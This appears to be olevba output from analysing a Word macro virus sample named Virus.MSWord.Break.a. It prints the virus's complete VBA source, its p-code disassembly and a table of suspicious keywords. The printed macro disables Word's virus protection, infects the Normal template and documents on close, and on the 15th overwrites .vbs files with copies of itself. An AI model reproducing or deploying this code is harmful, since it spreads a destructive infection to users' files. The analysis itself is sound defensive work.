olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.Break.a
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Virus.MSWord.Break.a - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'1nternal
'VBS/DOC
'On Error Resume Next
'Set FSO = CreateObject("Scripting.FileSystemObject")
'Set WshShell = CreateObject("Wscript.Shell")
'Parent = WScript.ScriptFullName
'vPath = Left(Parent, InStrRev(Parent, "\"))
'For Each Target In FSO.GetFolder(vPath).Files
'    FSO.CopyFile Parent, Target.Name, 1
'Next
'Set WordObj = CreateObject("Word.Application")
'Set NT = WordObj.Templates(1).VBProject.VBComponents(1).CodeModule
'If NT.Lines(1, 1) <> "'1nternal" Then
'    WordObj.Options.SaveNormalPrompt = False
'    NT.DeleteLines 1, NT.CountOfLines
'    NT.AddFromFile WScript.ScriptFullName
'    Call SharedReplace
'    NT.ReplaceLine 30, "    On Error Goto Break"
'End If

Private NT

Private Sub SharedReplace()
    For i = 3 To 19
        NT.ReplaceLine i, "'" + NT.Lines(i, 1)
    Next
End Sub

Private Sub Document_Close()
    On Error GoTo Break
    Set NT = NormalTemplate.VBProject.VBComponents(1).CodeModule
    Set AD = ActiveDocument.VBProject.VBComponents(1).CodeModule

    Options.VirusProtection = False
        Options.ConfirmConversions = False
        Options.SaveNormalPrompt = False
        If NT.Lines(1, 1) <> "'1nternal" Then
                For i = 1 To 71
                        NT.InsertLines i, AD.Lines(i, 1)
                Next
        End If
        If AD.Lines(1, 1) <> "'1nternal" Then
                For i = 1 To 71
                        AD.InsertLines i, NT.Lines(i, 1)
                Next
        End If
    If Day(Now) = 15 Then
        Set FSO = CreateObject("Scripting.FileSystemObject")
        For i = 3 To 19
            NT.ReplaceLine i, Mid(NT.Lines(i, 1), 2)
        Next
        Set fs = Application.FileSearch
                    fs.NewSearch
                    fs.LookIn = "A:\"
                    fs.SearchSubFolders = True
                    fs.FileName = "*.vbs"
                    fs.Execute
                    For i = 1 To fs.FoundFiles.Count
                            Set f = FSO.OpenTextFile(fs.FoundFiles(i), 2, True)
                            NT.ReplaceLine 30, "'On ErrLine"
                            For k = 1 To 71
                                    f.Write NT.Lines(k, 1) + Chr(13) + Chr(10)
                            Next
                        f.Close
                    Next
        Call SharedReplace
        NT.ReplaceLine 30, "     On ErRoR Goto BreAk"
    End If
Break:
End Sub

-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: ./Virus.MSWord.Break.a
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 4818 bytes
' Line #0:
' 	QuoteRem 0x0000 0x0008 "1nternal"
' Line #1:
' 	QuoteRem 0x0000 0x0007 "VBS/DOC"
' Line #2:
' 	QuoteRem 0x0000 0x0014 "On Error Resume Next"
' Line #3:
' 	QuoteRem 0x0000 0x0034 "Set FSO = CreateObject("Scripting.FileSystemObject")"
' Line #4:
' 	QuoteRem 0x0000 0x002C "Set WshShell = CreateObject("Wscript.Shell")"
' Line #5:
' 	QuoteRem 0x0000 0x001F "Parent = WScript.ScriptFullName"
' Line #6:
' 	QuoteRem 0x0000 0x002B "vPath = Left(Parent, InStrRev(Parent, "\"))"
' Line #7:
' 	QuoteRem 0x0000 0x002D "For Each Target In FSO.GetFolder(vPath).Files"
' Line #8:
' 	QuoteRem 0x0000 0x0027 "    FSO.CopyFile Parent, Target.Name, 1"
' Line #9:
' 	QuoteRem 0x0000 0x0004 "Next"
' Line #10:
' 	QuoteRem 0x0000 0x002E "Set WordObj = CreateObject("Word.Application")"
' Line #11:
' 	QuoteRem 0x0000 0x0042 "Set NT = WordObj.Templates(1).VBProject.VBComponents(1).CodeModule"
' Line #12:
' 	QuoteRem 0x0000 0x0025 "If NT.Lines(1, 1) <> "'1nternal" Then"
' Line #13:
' 	QuoteRem 0x0000 0x002C "    WordObj.Options.SaveNormalPrompt = False"
' Line #14:
' 	QuoteRem 0x0000 0x0025 "    NT.DeleteLines 1, NT.CountOfLines"
' Line #15:
' 	QuoteRem 0x0000 0x0029 "    NT.AddFromFile WScript.ScriptFullName"
' Line #16:
' 	QuoteRem 0x0000 0x0016 "    Call SharedReplace"
' Line #17:
' 	QuoteRem 0x0000 0x0030 "    NT.ReplaceLine 30, "    On Error Goto Break""
' Line #18:
' 	QuoteRem 0x0000 0x0006 "End If"
' Line #19:
' Line #20:
' 	Dim (Private) 
' 	VarDefn NT
' Line #21:
' Line #22:
' 	FuncDefn (Private Sub SharedReplace())
' Line #23:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0003 
' 	LitDI2 0x0013 
' 	For 
' Line #24:
' 	Ld i 
' 	LitStr 0x0001 "'"
' 	Ld i 
' 	LitDI2 0x0001 
' 	Ld NT 
' 	ArgsMemLd Lines 0x0002 
' 	Add 
' 	Ld NT 
' 	ArgsMemCall ReplaceLine 0x0002 
' Line #25:
' 	StartForVariable 
' 	Next 
' Line #26:
' 	EndSub 
' Line #27:
' Line #28:
' 	FuncDefn (Private Sub Document_Close())
' Line #29:
' 	OnError Break 
' Line #30:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	Set NT 
' Line #31:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	Set AD 
' Line #32:
' Line #33:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #34:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt ConfirmConversions 
' Line #35:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #36:
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld NT 
' 	ArgsMemLd Lines 0x0002 
' 	LitStr 0x0009 "'1nternal"
' 	Ne 
' 	IfBlock 
' Line #37:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x0047 
' 	For 
' Line #38:
' 	Ld i 
' 	Ld i 
' 	LitDI2 0x0001 
' 	Ld AD 
' 	ArgsMemLd Lines 0x0002 
' 	Ld NT 
' 	ArgsMemCall InsertLines 0x0002 
' Line #39:
' 	StartForVariable 
' 	Next 
' Line #40:
' 	EndIfBlock 
' Line #41:
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld AD 
' 	ArgsMemLd Lines 0x0002 
' 	LitStr 0x0009 "'1nternal"
' 	Ne 
' 	IfBlock 
' Line #42:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x0047 
' 	For 
' Line #43:
' 	Ld i 
' 	Ld i 
' 	LitDI2 0x0001 
' 	Ld NT 
' 	ArgsMemLd Lines 0x0002 
' 	Ld AD 
' 	ArgsMemCall InsertLines 0x0002 
' Line #44:
' 	StartForVariable 
' 	Next 
' Line #45:
' 	EndIfBlock 
' Line #46:
' 	Ld Now 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x000F 
' 	Eq 
' 	IfBlock 
' Line #47:
' 	SetStmt 
' 	LitStr 0x001A "Scripting.FileSystemObject"
' 	ArgsLd CreateObject 0x0001 
' 	Set FSO 
' Line #48:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0003 
' 	LitDI2 0x0013 
' 	For 
' Line #49:
' 	Ld i 
' 	Ld i 
' 	LitDI2 0x0001 
' 	Ld NT 
' 	ArgsMemLd Lines 0x0002 
' 	LitDI2 0x0002 
' 	ArgsLd Mid$ 0x0002 
' 	Ld NT 
' 	ArgsMemCall ReplaceLine 0x0002 
' Line #50:
' 	StartForVariable 
' 	Next 
' Line #51:
' 	SetStmt 
' 	Ld Application 
' 	MemLd FileSearch 
' 	Set fs 
' Line #52:
' 	Ld fs 
' 	ArgsMemCall NewSearch 0x0000 
' Line #53:
' 	LitStr 0x0003 "A:\"
' 	Ld fs 
' 	MemSt LookIn 
' Line #54:
' 	LitVarSpecial (True)
' 	Ld fs 
' 	MemSt SearchSubFolders 
' Line #55:
' 	LitStr 0x0005 "*.vbs"
' 	Ld fs 
' 	MemSt FileName 
' Line #56:
' 	Ld fs 
' 	ArgsMemCall Execute 0x0000 
' Line #57:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld fs 
' 	MemLd FoundFiles 
' 	MemLd Count 
' 	For 
' Line #58:
' 	SetStmt 
' 	Ld i 
' 	Ld fs 
' 	ArgsMemLd FoundFiles 0x0001 
' 	LitDI2 0x0002 
' 	LitVarSpecial (True)
' 	Ld FSO 
' 	ArgsMemLd OpenTextFile 0x0003 
' 	Set False 
' Line #59:
' 	LitDI2 0x001E 
' 	LitStr 0x000B "'On ErrLine"
' 	Ld NT 
' 	ArgsMemCall ReplaceLine 0x0002 
' Line #60:
' 	StartForVariable 
' 	Ld k 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x0047 
' 	For 
' Line #61:
' 	Ld k 
' 	LitDI2 0x0001 
' 	Ld NT 
' 	ArgsMemLd Lines 0x0002 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x000A 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	Ld False 
' 	ArgsMemCall Xor 0x0001 
' Line #62:
' 	StartForVariable 
' 	Next 
' Line #63:
' 	Ld False 
' 	ArgsMemCall Close 0x0000 
' Line #64:
' 	StartForVariable 
' 	Next 
' Line #65:
' 	ArgsCall (Call) SharedReplace 0x0000 
' Line #66:
' 	LitDI2 0x001E 
' 	LitStr 0x0018 "     On ErRoR Goto BreAk"
' 	Ld NT 
' 	ArgsMemCall ReplaceLine 0x0002 
' Line #67:
' 	EndIfBlock 
' Line #68:
' 	Label Break 
' Line #69:
' 	EndSub 
' Line #70:
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|Suspicious|Write               |May write to a file (if combined with Open)  |
|Suspicious|CopyFile            |May copy a file                              |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Wscript.Shell       |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|Xor                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

